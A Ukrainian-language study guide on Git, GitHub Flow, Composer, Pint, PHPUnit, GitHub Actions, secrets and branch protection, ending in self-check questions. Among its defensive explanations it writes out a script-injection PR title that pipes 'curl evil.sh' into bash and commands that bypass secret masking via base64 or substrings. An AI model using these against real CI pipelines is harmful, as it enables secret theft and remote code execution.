01Модель Git: що насправді зберігається

Git — розподілена система контролю версій. «Розподілена» означає, що повна історія є в кожного клона, а сервер (GitHub) — це лише точка синхронізації. Тому git commit працює офлайн, а git push — окрема мережева операція.

Три зони

Working treeФайли на диску, які ви редагуєте
→
Index / staging.git/index — що увійде в наступний коміт
→
Repository.git/objects — незмінна історія

git add копіює зміни в індекс, git commit перетворює індекс на знімок в історії. Розділення індексу й коміту дозволяє комітити частину змін: саме так роблять атомарні коміти.

Коміт — це знімок, а не diff

Коміт містить: хеш (SHA-1/SHA-256), автора й дату, повідомлення, посилання на батьківський коміт (або кілька — тоді це merge-коміт) і вказівник на кореневе дерево. Diff обчислюється на льоту порівнянням двох знімків.

Гілка — рухомий покажчик

        main
         │
         ▼
   A ← B ← C ← D
            ▲   ▲
            │   └── feature   (HEAD → feature)
            └────── main

Гілка — це файл у .git/refs/heads/ з 40-символьним хешем. Саме тому створення гілки — операція за мікросекунди: вона не копіює файли. HEAD — покажчик на поточну гілку.

Злиття: fast-forward і three-way

ВаріантКолиРезультат
Fast-forwardцільова гілка не рухаласяпокажчик просто пересувається, історія лінійна, merge-коміту немає
Three-way mergeобидві гілки мали нові комітистворюється merge-коміт із двома батьками

Конфлікт виникає, коли обидві гілки змінили однакові рядки (або одна змінила, а інша видалила). Git ставить маркери <<<<<<< HEAD / ======= / >>>>>>>; далі — ручне редагування, git add, git commit. Скасувати спробу: git merge --abort.

merge vs rebaseMerge зберігає реальну історію (з мережею), rebase переписує ваші коміти поверх іншої гілки (лінійно). Rebase безпечний лише для локальних, ще не опублікованих комітів.

.gitignore

/vendor/          # залежності Composer
.env              # локальні секрети
.env.*
!.env.example     # виняток — шаблон комітимо
.phpunit.result.cache
.idea/
.vscode/
*.log
  • ! — виняток із попереднього правила;
  • /vendor/ — від кореня, vendor/ — у будь-якому місці;
  • файл не діє на вже відстежувані файли: потрібно git rm --cached <file>, інакше вони так і залишаться в історії.
Чому .gitignore створюють першимЯкщо закомітити vendor/ або .env до появи правил, вони потраплять в історію. Прибрати файл потім недостатньо — він лишається в старих комітах.

Небезпечні команди

КомандаНаслідок
git reset --hardвтрата незакомічених змін без попередження
git push --forceперезапис віддаленої гілки, ламає чужі клони
git clean -fdxвидаляє всі untracked-файли, включно з .env
git commit --amendзмінює останній коміт; небезпечно, якщо вже запушено

02Стратегії гілкування

Питання не «чи потрібні гілки», а «як довго вони живуть». Довгоживуча гілка = дорогий merge і пізній фідбек.

GitFlow

main (релізи) + develop (інтеграція) + feature/*, release/*, hotfix/*. Потужно для версійних продуктів, надлишково для невеликих команд.

GitHub Flow — наш варіант

  1. main завжди робочий.
  2. Будь-яка зміна — окрема гілка від main.
  3. Push → Pull Request → review → CI.
  4. Merge у main, гілка видаляється.
mainстабільна, захищена
→
feature/*ізольована робота
→
PR + CIперевірки й рев'ю
→
mergeнова версія main

Trunk-based

Усі комітять у main або в гілки на кілька годин; обов'язкові feature toggles і сильний CI. Вимагає зрілої культури тестів.

Іменування

ПатернПрикладКоли
feature/<name>feature-cicd-pipelineнова функціональність
fix/<name>fix/pint-formattingвиправлення бага
chore/<name>chore/gitignoreінфраструктура, залежності
feature/issue-<N>feature/issue-2гілка під конкретну задачу

Стиль у лабі — kebab-case, без пробілів і кирилиці: простіше посилатися, менше проблем у терміналі та URL.

03Pull Request і code review

Pull Request — запит «злити мою гілку в іншу». Технічно це base (гілка-приймач, main) і head (ваша гілка). Diff будується між гілками, а не між окремими комітами.

Навіщо рев'ю

ПричинаЕфект
Друга пара очейловить логічні помилки, які не ловлять тести
Передача знанькоманда розуміє код, який не писала
Єдиний стильменше «шуму» в майбутніх diff
Контроль архітектури«швидкий хак» не потрапляє в main

Стани рев'ю

СтанЗначення
Commentзауваження без блокування
Approve«згоден, можна зливати»
Changes requestedє блокуючі зауваження
Approval ≠ коментар «+1»Лічильник «2 approvals» у branch protection рахує лише формальні рев'ю: Review changes → Approve → Submit review. Коментар із плюсом не зарахується.

Корисні механізми

  • Draft PR — робота в процесі, merge заблоковано;
  • Reviewers / Assignees — хто перевіряє / хто відповідальний;
  • Files changed — diff із позначкою «Viewed»;
  • Checks — статуси CI, обов'язкові для merge;
  • Merge strategies — merge commit, squash, rebase;
  • Auto-merge — злити автоматично, коли всі умови виконані.

Шаблон PR

## Task link
Closes #

## What has been changed?

## Important notes

## Self-checks
- [ ] Код відформатовано (pint --test)
- [ ] Тести проходять

Шаблон у .github/PULL_REQUEST_TEMPLATE.md підставляється автоматично. Він змушує автора відповісти на три питання: навіщо (Task link), що змінено, на що звернути увагу. Це економить цикл «а що ти тут хотів?».

05Composer: залежності та автозавантаження

Composer читає composer.json, розв'язує граф залежностей, ставить пакети у vendor/, генерує vendor/autoload.php і фіксує точні версії в composer.lock.

require vs require-dev

СекціяДля чогоНа продакшені
requireпотрібно застосунку для роботивстановлюється
require-devтести, лінтери, генераторипропускається з --no-dev

У лабі phpunit/phpunit і laravel/pint — саме dev-залежності.

PSR-4: ім'я класу → шлях до файлу

"autoload": {
  "psr-4": { "App\\": "app/" }
},
"autoload-dev": {
  "psr-4": { "Tests\\": "tests/" }
}

App\Services\Calculator → app/Services/Calculator.php. Правило вимагає точного збігу регістру. Linux-раннер регістрозалежний, Windows — ні: код може працювати локально й падати в CI.

lock і vendor

Файл/каталогКомітитиЧому
composer.jsonтакдекларація залежностей
composer.lockтакточні версії → відтворювані збірки
vendor/нівідновлюється з lock

composer install ставить версії з lock; composer update перераховує lock. У CI — завжди install.

Прапорці для CI

composer install -q --no-ansi --no-interaction \
  --no-progress --no-scripts --prefer-dist
ПрапорецьНавіщо
--no-interactionу CI немає TTY, не можна чекати введення
--no-progressпрогрес-бар засмічує логи
--no-ansiбез кольорових escape-кодів
--prefer-distархіви замість git clone — швидше
--no-scriptsне запускати post-install скрипти
Одруківка методички--no progress (з пробілом) — Composer сприймає progress як окремий аргумент і завершується помилкою. Правильно: --no-progress.

06PSR і Laravel Pint

PSR, які треба знати

СтандартПро що
PSR-1<?php без закривального тегу, класи в StudlyCaps, константи UPPER_CASE, UTF-8 без BOM
PSR-4автозавантаження: простори імен ↔ каталоги
PSR-12розширений стиль: 4 пробіли, фігурні дужки, пробіли навколо операторів

Порушення, навмисно закладене в лабу:

return $x+$y;     // ❌ PSR-12: немає пробілів навколо бінарного оператора
return $x + $y;   // ✅

Pint

Pint — обгортка над PHP-CS-Fixer із пресетами (за замовчуванням laravel). Бінарник — vendor/bin/pint.

КомандаДія
./vendor/bin/pintвиправляє файли
./vendor/bin/pint --testтільки перевіряє; exit code ≠ 0 при порушеннях
./vendor/bin/pint app/Servicesконкретний каталог
./vendor/bin/pint --preset psr12інший пресет
Чому в CI саме --testCI не повинен змінювати код — він має повідомити про проблему. Інакше раннер «виправляє» файли, яких ніхто не бачить, і перевірка втрачає сенс.

Чому лінт перед тестами

  • Дешево: секунди проти хвилин на встановлення й прогін тестів;
  • Ранній фідбек: автор одразу бачить стильову помилку;
  • Чистий diff: стильові правки не змішуються з логічними;
  • Детермінованість: стиль не залежить від середовища.

07PHPUnit: тести як контракт

РівеньЩо перевіряєШвидкістьЗалежності
Unitодин клас/метод в ізоляціїмілісекундибез БД і мережі
Integrationвзаємодію компонентівсекундиБД, контейнер
Feature/E2Eсценарій користувачахвилиниповний стек

Анатомія тесту: AAA

public function test_add_returns_sum(): void
{
    $calculator = new Calculator();      // Arrange — підготовка
    $result = $calculator->add(2, 3);    // Act     — дія
    $this->assertSame(5, $result);       // Assert  — перевірка
}
  • метод починається з test (або має атрибут #[Test]);
  • клас extends PHPUnit\Framework\TestCase;
  • assertSame (===) краще за assertEquals (==): ловить різницю типів 5 vs "5".

Основні твердження

МетодПеревіряє
assertSame($exp, $act)ідентичність (===)
assertEquals()рівність (==)
assertTrue / assertFalseбулеве значення
assertCount($n, $arr)кількість елементів
assertInstanceOf()тип об'єкта
expectException()очікуваний виняток

phpunit.xml

<?xml version="1.0" encoding="UTF-8"?>
<phpunit bootstrap="vendor/autoload.php" colors="true">
  <testsuites>
    <testsuite name="Unit">
      <directory>tests/Unit</directory>
    </testsuite>
  </testsuites>
</phpunit>

bootstrap підключає автозавантажувач Composer — без нього клас App\Services\Calculator не знайдеться.

Код виходу — мова спілкування з CI

./vendor/bin/phpunit tests/Unit        # весь каталог
./vendor/bin/phpunit --filter=test_add # один тест
./vendor/bin/phpunit --testdox         # читабельний вивід

0 — успіх, ≠0 — падіння. CI реагує саме на код виходу: ненульовий → крок червоний → job червоний → merge заблокований.

08CI/CD і GitHub Actions

ТермінСуть
CIкожна зміна автоматично збирається й перевіряється (лінт, тести)
CD (delivery)артефакт завжди готовий до релізу; деплой — ручний
CD (deployment)деплой автоматично після зелених перевірок

Анатомія workflow

name: PHP CI Application        # назва workflow
on:                             # тригери
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
jobs:
  build:                        # job → ім'я статус-чеку
    runs-on: ubuntu-latest      # раннер
    steps:                      # кроки, послідовно
      - uses: actions/checkout@v4
      - uses: shivammathur/setup-php@v2
        with:
          php-version: '8.2'
          tools: composer
      - name: Install Dependencies
        run: composer install -q --no-interaction --no-progress --prefer-dist
      - name: Lint code with Pint
        run: ./vendor/bin/pint --test
      - name: Run unit tests
        run: ./vendor/bin/phpunit tests/Unit
      - name: Demonstrate GitHub Secrets
        run: echo "Secret value is ${{ secrets.MY_SUPER_SECRET_KEY }}"
Головне правило структуриJobs виконуються паралельно, кроки всередині job — послідовно й ділять один workspace. Залежність між jobs задається через needs:.

YAML-пастки

ПорушенняНаслідок

відступ не кратний 2кроки «з'їжджають», частина не виконується
двокрапка без лапок у run:YAML трактує як нову пару ключ-значення

Щоготова дія з Marketplaceshell-команда
Прикладactions/checkout@v4composer install
Параметриwith:аргументи команди

@main — погана практика: зміни в чужому репо можуть зламати ваш пайплайн. Безпечно — тег major (@v4) або, максимально, конкретний SHA.

Розбір кроків цієї лаби

КрокЩо робитьЧому саме так
checkoutклонує репо в раннербез нього немає файлів

composer installставить залежності-q і --no-progress — чисті логи

Чому перший запуск буде червонимУ Calculator.php навмисно return $x+$y;. Pint повертає ненульовий код → job build = failure → статус-чек у PR червоний → branch protection блокує Merge. Це і є демонстрація CI.

09GitHub Secrets

Secret — зашифроване значення, доступне workflow, але невидиме в репозиторії, логах і UI після створення.

РівеньДеОбласть
RepositorySettings → Secrets and variables → Actionsусі workflow репо
EnvironmentSettings → Environmentsjob'и з прив'язкою до environment (можна додати approval)
OrganizationOrg → Settings → Secretsусі репо організації з політикою доступу

Використання

- name: Demonstrate GitHub Secrets
  run: echo "Secret value is ${{ secrets.MY_SUPER_SECRET_KEY }}"
- name: Use secret as env
  env:
    API_TOKEN: ${{ secrets.MY_SUPER_SECRET_KEY }}
  run: ./script.sh

Маскування *** і його межі

  • GitHub замінює дослівний вміст секрету на *** у логах;
  • якщо значення закодувати (base64), розбити або змінити — у логах буде видно;
  • секрети не передаються у workflow з fork-PR — це захист від крадіжки токена через чужий PR.
Навчальна демонстрація ≠ практикаecho секрету безпечний лише як показ маскування. У реальному проєкті секрет не друкують: будь-яке перетворення рядка зруйнує маскування.

secrets.*vars.*

10Захист гілок

Branch protection — політика, яку GitHub застосовує до push/merge. Без неї будь-хто з правом write може запушити прямо в main в обхід PR і CI.

ПравилоЩо робить
Require a pull requestпрямий push заборонено
Require approvals: Nпотрібно N формальних approve
Dismiss stale approvalsновий коміт скасовує попередні схвалення
Require status checksmerge лише при зелених чеках (build)
Require branches up to dateгілка мусить містити актуальний main
Require conversation resolutionусі коментарі мають бути resolved
Require linear historyзабороняє merge-коміти
Do not allow bypassingправила діють і для адміністраторів

⚠️ Порядок має значення

GitHub показує статус-чек у списку лише після того, як workflow хоча б раз виконався.

  1. PR #1 (без workflow) → 2 approve → merge.
  2. Гілка feature-cicd-pipeline + php-ci.yml → push → перший run (червоний).
  3. Тепер чек build існує → вмикаємо branch protection з require checks.
  4. Скріншот заблокованої кнопки Merge.
  5. Виправляємо стиль → зелений run → merge дозволено.
ПасткаЯкщо ввімкнути «Require status checks → build» на PR, у якому workflow ще не існує, PR може заблокуватися назавжди: чек ніколи не з'явиться.

Що таке статус-чек технічно

Кожен job публікує commit status із контекстом (ім'я job'а, напр. build) і станом queued / in_progress / success / failure. Protection перевіряє останній статус для поточного head-коміту PR. Новий push = новий SHA = потрібен новий зелений статус; попередні «зелені» не рятують.

11Issues, мітки, Projects і Kanban

Issue — одиниця роботи: баг, задача, ідея. Містить title, опис (Markdown), assignee, labels, milestone, project, коментарі.

14Питання для самоперевірки

21 питання: 4 прості (перевірка бази), 7 середніх (розуміння механізмів), 10 глибоких (те, що питають на захисті й на співбесіді). Відповідь розкривається кліком.

Прості база

1. Що таке коміт і з чого він складається?

Коміт — незмінний знімок стану проєкту в певний момент. Він містить:

  • хеш (SHA-1/SHA-256) — унікальний ідентифікатор, обчислений зі вмісту;
  • вказівник на кореневе дерево файлів (tree);
  • посилання на батьківський коміт (0 — перший, 1 — звичайний, 2 — merge);
  • автора, комітера, дати;
  • повідомлення.

Коміт зберігає весь знімок, а не diff. Diff обчислюється на льоту порівнянням двох знімків. Хеш залежить від вмісту й батька, тому зміна історії (amend/rebase) породжує нові хеші.

2. Для чого потрібен .gitignore?

Він перелічує патерни, які Git не відстежує: залежності (/vendor/), локальні секрети (.env), кеші (.phpunit.result.cache), файли IDE (.idea/, .vscode/), логи.

Мета — не тримати в історії те, що відновлюється (vendor з lock) або не повинно потрапляти в репозиторій (секрети). Важливо: файл не діє на вже відстежувані файли — потрібен git rm --cached.

3. Що таке Pull Request і чим він відрізняється від git merge?

PR — це запит на злиття гілки head у гілку base, який супроводжується diff, обговоренням, рев'ю та статус-чеками. Це функція хостингу (GitHub), а не Git.

git merge — локальна операція, яка безпосередньо змінює гілки. PR — це процес і контроль навколо можливого merge: хтось перевірив, CI зелений, немає блокуючих зауважень. Технічно кнопка Merge у GitHub виконує той самий merge (або squash/rebase) на сервері.

4. Що робить pint --test і як CI дізнається, що є порушення?

pint --test перевіряє відповідність стилю, нічого не змінюючи. Якщо знайдено порушення — процес завершується з ненульовим кодом виходу.

Саме на код виходу реагує GitHub Actions: 0 → крок успішний, ≠0 → крок червоний → job build = failure → статус-чек у PR червоний. Без --test (pint) інструмент виправив би файли, але в CI це безглуздо: зміни ніхто не побачить.

Середні механізми

5. Чому composer.lock комітять, а vendor/ — ні?

composer.lock фіксує точні версії всіх залежностей (включно з транзитивними) і їхні хеші. Завдяки йому composer install на іншій машині й на раннері ставить той самий набір пакетів — це відтворюваність збірки.

vendor/ — це результат, а не джерело. Він великий (десятки тисяч файлів), не потребує рев'ю і повністю відновлюється з lock. Комітити його — роздувати історію й отримувати безглузді diff.

Виняток: бібліотеки (пакети, які підключають інші) часто не комітять lock — щоб споживачі могли оновлювати залежності.

6. Чим require відрізняється від require-dev і як це впливає на деплой?

require — залежності, потрібні застосунку у продакшені. require-dev — лише для розробки й CI: PHPUnit, Pint, генератори, фейкові дані.

На продакшені ставлять composer install --no-dev --optimize-autoloader: менше пакетів → менший образ, менша поверхня атаки, швидший старт. У CI ж потрібні саме dev-залежності, тому там --no-dev не використовують.

Типова помилка: покласти тестовий фреймворк у require — і тягнути його в продакшен.

7. Чому лінтер запускають перед тестами, а не після?
  • Дешевше й швидше: перевірка стилю — секунди, тести зі встановленням залежностей — хвилини. Немає сенсу витрачати час на тести, якщо код усе одно не пройде рев'ю.
  • Ранній фідбек: автор бачить стильову помилку через 20 секунд, а не через 5 хвилин.
  • Чистий diff: автоматичні стильові правки не змішуються з логічними.
  • Детермінованість: стиль не залежить від середовища, тести можуть «флакати».

Це загальний принцип конвеєра: від найдешевших перевірок до найдорожчих (fail fast).

8. Чому branch protection із чеком build не можна вмикати до першого запуску workflow?

GitHub додає статус-чек у список доступних лише після того, як workflow хоча б раз опублікував статус із таким контекстом. Якщо ввімкнути «Require status checks → build» раніше, правило посилатиметься на чек, який не існує.

Наслідок: PR блокується, бо необхідний чек ніколи не стане зеленим. Для PR #1 (де workflow ще немає в гілці) це означало б вічне блокування.

Правильна послідовність: спочатку push workflow → перший run (нехай навіть червоний) → і лише потім правило з require checks.

9. Чим git pull відрізняється від git fetch?

git fetch лише завантажує нові коміти з віддаленого репозиторію в локальні origin/*, не змінюючи вашу робочу гілку. Це безпечна операція «подивитися, що нового».

git pull = fetch + merge (або rebase, якщо налаштовано). Тобто він одразу інтегрує зміни у вашу гілку — і може спричинити конфлікт або несподіваний merge-коміт.

Практика: перед ризикованими діями краще fetch + git log origin/main, а вже потім свідомо мержити.

10. Чому секрети не передаються у workflow з fork-PR?

Бо інакше будь-хто міг би відкрити PR зі свого форку, додати крок echo ${{ secrets.TOKEN }} (або надіслати його на свій сервер) і вкрасти токен деплою чи ключ до БД.

Тому GitHub для PR із форків:

  • не передає repository secrets;
  • обмежує GITHUB_TOKEN правами read-only;
  • вимагає ручного підтвердження першого запуску для нових контриб'юторів.

Безпечні варіанти для зовнішніх PR: pull_request_target (з обережністю — не виконувати код із PR), environment із ручним approval або окремий workflow після merge.

11. Що таке статус-чек і чому після нового push потрібен новий зелений статус?

Статус-чек — запис у commit status API: контекст (ім'я job'а, напр. build), стан (queued → in_progress → success/failure) і прив'язка до конкретного SHA коміту.

Branch protection перевіряє статус для поточного head-коміту PR. Новий коміт = новий SHA = інший набір статусів. Тому «зелений» прогін на старому коміті не переноситься — інакше можна було б пройти перевірки, а потім підмінити код.

Це ж причина, чому «Require branches to be up to date» має сенс: зелений статус на застарілій базі не гарантує, що код зіллється без конфліктів.

Глибокі захист / співбесіда

12. Чому гілка в Git «дешева»? Що таке detached HEAD і чим він небезпечний?

Дешевизна. Гілка — це файл у .git/refs/heads/<name>, що містить 40-символьний SHA. Створення гілки не копіює жодного файлу; перемикання — оновлення вказівника й робочої копії. Тому в Git нормально мати десятки гілок.

Detached HEAD — стан, коли HEAD вказує безпосередньо на коміт, а не на гілку (напр., після git checkout <sha>). Нові коміти в цьому стані не належать жодній гілці: після перемикання вони стають «сиротами» й збираються garbage collector.

Небезпека: здається, що ви «просто подивилися старий коміт», а потім зробили зміни й коміт — і вони зникли. Правильно: git switch -c fix/foo одразу, якщо плануєте щось змінювати. Знайти загублене: git reflog.

13. Поясніть fast-forward vs three-way merge. Як Git знаходить базу злиття і чому конфлікт виникає саме там?

Fast-forward можливий, коли цільова гілка (напр., main) є предком вашої: в історії немає «розходження». Git просто пересуває покажчик — merge-коміт не створюється.

Three-way merge потрібен, коли обидві гілки мають коміти після спільного предка. Git знаходить merge base — найближчого спільного предка (через обхід графа, зазвичай алгоритмом на зразок Lowest Common Ancestor із урахуванням кількох батьків).

Далі для кожного файлу порівнюються три версії: base, ours, theirs. Якщо зміни не перетинаються — вони зливаються автоматично. Якщо перетинаються (той самий регіон рядків) — конфлікт: Git не знає, чию версію обрати, і не має права вгадувати.

Тонкість: конфлікт виникає не «за рядком», а за ділянкою (hunk). Тому сусідні зміни іноді конфліктують, а зміни в різних частинах файлу — ні.

14. Чому .gitignore не діє на вже відстежувані файли? Як прибрати файл з історії і які наслідки?

Бо .gitignore — це фільтр для нових untracked-файлів. Якщо файл уже в індексі, Git продовжує його відстежувати: ігнорування не «видаляє» його з індексу.

Прибрати з поточного відстеження, залишивши на диску:

git rm --cached .env
git rm -r --cached vendor/
git commit -m "chore: stop tracking .env and vendor"

Але файл залишиться в історії — у старих комітах. Якщо це секрет, його треба вважати скомпрометованим і ротувати, а не лише «видалити».

Повне очищення історії (git filter-repo, BFG Repo-Cleaner) переписує всі хеші: усі клони стають несумісними, потрібен force-push, а відкриті PR і теги ламаються. У командній роботі це узгоджена операція, а не «швидка правка».

15. Як працює маскування секретів і чому base64 його ламає? Які ризики echo секрету?

GitHub зберігає секрети в зашифрованому вигляді й підставляє їх у workflow лише в момент виконання. У логах він шукає точний рядок значення і замінює його на ***. Механізм — проста текстова заміна, а не «розуміння контексту».

Тому будь-яка трансформація руйнує маскування:

echo -n "$SECRET" | base64      # у логах буде видно base64, не ***
echo "${SECRET:0:8}"            # частковий рядок — не маскується
printf '%s' "$SECRET" | rev     # перевернуте значення — не маскується

Ризики echo:

  • помилка в конвеєрі (обгортка, кодування, багаторядковість) — і секрет у логах;
  • логи можуть бути доступні ширшому колу, ніж репозиторій (артефакти, форки, експорт);
  • звичка друкувати секрети переноситься в реальні проєкти.

Правильно: передавати секрет у змінну середовища й використовувати в команді, яка не друкує його (env: TOKEN: ${{ secrets.TOKEN }}), а для перевірки — друкувати лише факт наявності (test -n "$TOKEN" && echo "present").

16. Чому код працює локально (Windows), але падає в CI (Linux)?

Кілька типових причин, і всі вони — про розбіжність середовищ:

  • Регістр у PSR-4. App\Services\calculator на Windows знайде Calculator.php (ФС нечутлива до регістру), на Linux — ні. CI падає з Class not found.
  • Закінчення рядків. core.autocrlf на Windows перетворює LF→CRLF; деякі лінтери/скрипти на Linux чутливі до \r (напр., shebang у shell-скриптах).
  • Розширення PHP. Локально може бути fileinfo, pdo_sqlite, zip; на раннері — ні, якщо не вказані в extensions:.
  • Версія PHP/Composer. Локально 8.3, у CI 8.2 — різниця в типах, deprecations.
  • Шляхи. \ vs /, регістр дисків, домашні каталоги.

Висновок: CI — це єдине джерело істини про сумісність. Локальний успіх — необхідна, але не достатня умова. Практика: тримати версії в setup-php й composer.json ("php": "^8.2") синхронними з локальними.

17. Що таке відтворюваність збірки та ідемпотентність пайплайну?

Відтворюваність — однаковий вхід (коміт + lock + версії інструментів) дає однаковий результат на будь-якій машині й у будь-який час.

Складові:

  • composer.lock замість «плаваючих» версій;
  • фіксована версія PHP (php-version: '8.2');
  • пінінг actions — ідеально за SHA, мінімум за major-тегом;
  • відсутність прихованих залежностей від локального стану (кеші, .env, глобальні пакети);
  • детерміновані тести (без now(), випадкових даних без seed).

Ідемпотентність — повторний запуск не змінює результат: якщо job упав посередині й перезапустився, він не має «подвоїти» міграції, не створити дублікати, не залежати від попереднього часткового стану. Тому в CI уникають кроків на кшталт «дописати в кінець файлу» без перевірки.

Перевірка на практиці: запустити workflow двічі на тому самому коміті — результат має бути ідентичним.

18. Як branch protection + required checks + dismiss stale approvals утворюють контроль якості? Де тут race condition?

Три механізми закривають три різні «дірки»:

  • Require PR — не можна обійти рев'ю прямим push;
  • Required checks — не можна злити код, який не пройшов лінт/тести;
  • Dismiss stale approvals — не можна отримати approve на «хорошій» версії, а потім підмінити код.

Race condition без dismiss: рев'юер approve коміт A → автор пушить коміт B (з багом) → кнопка Merge активна, бо approval «валідний», а статус-чек... теж перерахується, але якщо B проходить тести, але містить логічну зміну, яку ніхто не бачив — merge відбувається без рев'ю. Dismiss stale approvals закриває саме це: новий push анулює схвалення.

Друга умова — «Require branches to be up to date»: вона гарантує, що зелений статус отримано на коді, який реально зіллється з поточним main, а не на застарілій базі.

Для великих команд існує merge queue: PR'и шикуються в чергу й перевіряються на «передбачуваному» результаті злиття, щоб уникнути конфліктів «зелених поодинці, червоних разом».

19. Чому зелений CI не гарантує відсутності багів?

Бо тести перевіряють лише те, що в них написано. Основні обмеження:

  • Не повне покриття: 100% coverage не означає 100% перевірених сценаріїв — можна виконати рядок, не перевіривши його результат;
  • Неправильні очікування: тест може «закріпити» баг як правильну поведінку;
  • Межі unit-тестів: інтеграційні проблеми (БД, черги, час, конкурентність) не видно;
  • Flaky tests: нестабільні тести привчають ігнорувати червоний CI — це гірше за відсутність тестів;
  • Середовище: тести на SQLite не виявлять проблем MySQL/Postgres.

Що підвищує довіру: mutation testing (перевіряє, чи тести ловлять штучно внесені зміни), контрактні тести, інтеграційні/E2E на критичних шляхах, code review і статичний аналіз (PHPStan/Psalm).

Правильна теза для висновків: CI знижує ймовірність регресій і робить їх дешевими для виявлення, але не замінює мислення й рев'ю.

20. Як технічно працює автозакриття Issue і що змінюється при squash/rebase merge?

GitHub парсить текст опису PR, коментарів і повідомлень комітів на ключові слова (Fixes, Closes, Resolves + #N). Зв'язок зберігається як «reference» між PR і Issue.

Закриття відбувається в момент merge у default branch: GitHub перевіряє, що PR справді потрапив у дефолтну гілку, і закриває Issue зі статусом completed, додаючи подію closed this as completed in #PR.

Squash merge: усі коміти стають одним; ключове слово з опису PR усе одно працює, бо зв'язок іде через PR. Rebase merge: коміти переписуються (нові SHA) — і якщо Fixes #N було лише в повідомленні коміту, воно збережеться в новому повідомленні; але покладатися на це не варто — надійніше тримати Resolves #N в описі PR.

Чому не працює в назві PR: назва — це метадані для людей, GitHub не парсить її на closing keywords.

21. Безпека ланцюга постачання: чому uses: action@main небезпечно і як ${{ }} у run: відкриває ін'єкцію?

1. Плаваючий тег. @main означає «виконуй код, який зараз у чужому репозиторії». Власник дії (або зловмисник, що зламав його акаунт) може змінити код — і ваш наступний run виконає його з вашими секретами й GITHUB_TOKEN. Безпечно: пінінг за commit SHA (незмінний), принаймні — за major-тегом, який власник не переписує.

2. Права токена. За замовчуванням GITHUB_TOKEN може мати широкі права. Принцип найменших привілеїв:

permissions:
  contents: read

3. Script injection. Вирази ${{ }} підставляються до запуску shell, без екранування:

# НЕБЕЗПЕЧНО, якщо title приходить від користувача
- run: echo "PR title: ${{ github.event.pull_request.title }}"

Заголовок PR "; curl evil.sh | bash; echo " виконається як команда. Правильно — передавати через env і брати в лапки:

- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"

4. pull_request_target дає доступ до секретів, але виконується в контексті базової гілки. Якщо в такому workflow зробити checkout коду PR і запустити його — це прямий шлях до RCE з вашими секретами. Використовувати лише для дій, що не виконують код PR (лейбли, коментарі).
